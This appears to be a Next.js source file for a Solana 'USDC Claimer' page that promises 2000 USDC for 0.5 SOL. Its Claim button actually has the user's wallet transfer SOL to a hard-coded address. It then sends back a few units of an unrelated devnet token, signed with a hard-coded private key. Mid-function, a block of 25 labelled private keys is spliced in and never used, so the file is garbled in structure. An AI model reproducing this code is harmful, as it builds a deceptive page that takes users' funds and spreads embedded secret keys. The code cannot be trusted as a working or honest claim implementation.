/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3W4Kz62RhV3qjaTSwwNuEXJ6714TGF4ifr9qNf7fdPAjwsXfjAsgiDaLVAtdP5xjt4wio6ipqjeMEGY8rqjkPPiv"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5DFPSCiP7Yr5D9QAH43S4iXBkV9qbMCrBYiG4Ayg1pKVgqk4xrXnE7uHDKK91R24qaVCiBPnPVGPSF7jVCWRJhBA",
  "key1": "59vQLtGGwz8wgGDe3TDWTjTKo1V5Numn9pkMmahPu4pof1GBJHwUyNzu3GLT9V9F3CVuxCcd4NXJrrmVEp3JuKQX",
  "key2": "5SAJpUR9E19mpUtAn8G18KYTFuGtTYgTnmgqtszXnNwf2JSkaWBLG8zLV4MSZ79HpXSNK7hjNGJx9xHUuMGhCYsf",
  "key3": "Wd3UXvtMjgy7SdScareiNTYShDQ7LeFEDHNAuReVxTgJdiqw5XEEJfZev3EHpdQv2M8qQHXZUKhyWCHqrLjYa8B",
  "key4": "3fsb7FZGkRfQLSrvGH163nnpEgaJBt9szSJZS5EHNnW3C26mKybMvKwQhJ4F3Y69ukHrTV4UcPujLRHpAZgtdERK",
  "key5": "4Hcva2NZksCmzXqSZXXQ3fsz8Vwx6pxhgsUkpUPnJe9rzGT9T4phf2gaPUNowkBFLkj7qcbLsddbPmHihNh7rehk",
  "key6": "BKgyt5xg4MwcBUxXYy29czTsaaBtniiEkCU7MKmhAQqjZc51WYim1KdvsxQGnNNTVjcXsMEPZCPeiRQswM5EcHR",
  "key7": "5ADmT4yrv1SdfpFisCiGgRmZ6EyLEDBxiqm2eEJzK1uf7dL3KFiRv2PbBgR9ATbYhF4YhDhFDsAk4H65Nx38xEjZ",
  "key8": "3BWrYWdPQHvyq3nyF4cXukRzXGSmRSu9c6Dv1F5g8etjjGCL53SFBAdYFCkRjZzx72QsG19cJw39v85nbVZjExHb",
  "key9": "4iuZnodRTbm4EQGiquDTq9n4FYQXXR7UqbkUBYXat1qsiaceJUYBEFp2pnt9hrMTDcvs6EDXp9zZnvUtJFWVU6fP",
  "key10": "37n9Avj9EvMfprruhfzj2nS9Ror5G9t8vetgrTp7Rh5UvAkogMK7Ta91kjZmk4MR3kb8aGre8Z6W5TxYMqKk4KU7",
  "key11": "28XcHEXrCPGsNrbnzVhmD9DfFZ8JeuGUJtETh2ybJFErzuXSdWfH7u2yoPbzogCJqQ3N2uhpqoFnxCmvyu4dCjSx",
  "key12": "3iWY2GRxgE6vi1RFSfkHBMZzCTyU1TCSdgf8E6cuJZLW8oEnJF44GncHQ281LcWhUTEpbvAVRBY5oZYPazxNabtp",
  "key13": "VFV2Nv12FpsPu955o5M8vPzGCtjTEwTi8X8MjHMH6UPkXD1K4DKxadCHuCKw35R77AbAjz15Xurg2Y5SaEyDfqC",
  "key14": "5WSRYs935gnZ5xUbLz4uGmFBYdFtcxHUQVUUajF8ta5iSFGQK2BG4CGcqRW6uymNbmK7jCWbzxBjoTGBux5CLuBE",
  "key15": "2M2mueQnbJLVUJvCE2x1fvyAvjMyNtzyfy2Nt2vZSAkD5iFreoQbUjigKmjq3zp63WRmt9taRTyZpskHDtVgDY81",
  "key16": "4Mpx7W5LZAdqSMxQ2Ht2GUDQ5MoqQNcncyKeDuiHSK4NVshP7peEsaBDqqDi91kNuukJsQMEASsVJ8XY88UZ6rGs",
  "key17": "2zg6zMjpQ2LYNJWGmhw7pZMKqsCNHu7VJQ8v3898AmED7BsAzqZYgBJpj5ATkaA9hF3mbFy4i2FKC88agW3RXS3v",
  "key18": "2P3TWNH9viHkhDnVgix8xTp9WYvSpx6sxn7gyCVfPVoEo7hRL3r3hDZvPSf82ksBs1PbG5fUoAtRkYXQX9WVUWmC",
  "key19": "5VaxRRsq8NoM8Kxfh8jWjF6JypT8vZGXvWr7sgtfX5jJD9eGpj18mxUCHqFnKPQGugLZCT7uXo43CJbJupr2NEKW",
  "key20": "2YXbwNQLiH6LoezM8qZqvuPT68w8C5Xv7gPzuGbmmDGTFpazgUPYfedeym1TVEP3P6nfnaYLMjTPs5HSaWkb7Uds",
  "key21": "4asRPZcYLFvgcjzKyZQ9aMVwRwmidEwuH3M5tn4iTe5wtseFhp8bx5dwMUV5j2oeVNCbYkz3Y9PRFW8WWwnrfTw5",
  "key22": "5QpT4EaSQbCcV8RAsm6GzPc9S4sKgQH3eqqDZcsMrUboyEeYoh5QHtmGUGctFtRG2hpgMP2VftoHaPUC5ULCLh1S",
  "key23": "vr3HdcBpMf37L3wYd5bzKQdbTFtRuiPPVpdgmJRjcHpSwNfmtjcsH1k78wwr31MazG1gqo5zjfEEjPFUMBkFLqX",
  "key24": "52eCBmptrQ771izYuGPj6LJ8gnKEZDeR7TgMV2DFD1RnFXeX5f9BnbwuZtT5ozkMhKtjmkPycQSKARZnPUJuFXfK"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
